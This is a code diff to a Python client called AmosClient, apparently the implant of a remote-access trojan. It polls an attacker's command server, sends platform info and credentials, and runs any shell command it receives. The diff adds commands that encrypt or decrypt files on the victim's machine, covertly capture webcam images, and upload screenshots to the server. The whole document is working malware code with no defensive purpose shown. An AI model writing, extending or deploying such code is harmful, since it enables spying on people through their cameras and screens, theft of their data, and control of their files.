@@ -1,11 +1,11 @@
 import os
-from time import time, sleep
-from requests import get, post, exceptions
+from time import sleep
+from requests import get, exceptions
 from ServerHandler import ServerHandler
 from DataHarvester import DataHarvester
 from GeneralFeatures import GeneralFeatures
 from client_settings import (SERVER_IP, SERVER_PORT, PROXY, HEADER, CMD_REQUEST,
-                             CMD_RESPONSE, RESPONSE_KEY, DELAY, CLIENT_CREDENTIALS)
+                             DELAY, CLIENT_CREDENTIALS)
 
 
 class AmosClient:
@@ -24,7 +24,6 @@ class AmosClient:
         while True:
             try:
                 response = get(f"http://{SERVER_IP}:{SERVER_PORT}{CMD_REQUEST}{client}", headers=HEADER, proxies=PROXY)
-
                 if response.status_code == 200 and self.credentials_sent == False:
                     platform_info = self.data_harvester.get_platform_info()
                     self.server_handler.post_to_server(platform_info, CLIENT_CREDENTIALS)
@@ -56,14 +55,50 @@ class AmosClient:
                 except:
                     pass
 
+
+            elif command.startswith("encrypt "):
+                parts = command.split()
+                if len(parts) != 3:
+                    self.server_handler.post_to_server("[-] Usage: encrypt <filename> <password>")
+                else:
+                    filename = parts[1]
+                    password = parts[2]
+                    try:
+                        out = self.general_features.encrypt_file(filename, password)
+                        self.server_handler.post_to_server(f"[+] Encrypted: {out}")
+                    except Exception as e:
+                        self.server_handler.post_to_server(f"[-] Encrypt error: {e}")
+
+
+            elif command.startswith("decrypt "):
+                parts = command.split()
+                if len(parts) != 3:
+                    self.server_handler.post_to_server("[-] Usage: decrypt <filename> <password>")
+                else:
+                    filename = parts[1]
+                    password = parts[2]
+                    try:
+                        out = self.general_features.decrypt_file(filename, password)
+                        self.server_handler.post_to_server(f"[+] Decrypted: {out}")
+                    except Exception as e:
+                        self.server_handler.post_to_server(f"[-] Decrypt error: {e}")
+
+            # Send camshot
+            elif command == "camshot":
+                try:
+                    image_bytes = self.general_features.camshot()
+                    self.server_handler.post_to_server(image_data=image_bytes)
+                except Exception as e:
+                    self.server_handler.post_to_server(f"[-] Camshot error: {e}")
+
+            # Send screenshot
             elif command == "screenshot":
-                self.general_features.screenshot( )
-                # self.server_handler.send_file("screenshot.png")
+                img_bytes = self.general_features.screenshot()
+                self.server_handler.post_to_server(image_data=img_bytes)
                 if os.path.isfile("screenshot.png"):
                     os.remove("screenshot.png")
             else:
                 self.server_handler.run_command(command)
-
             print(response.status_code)
 
 
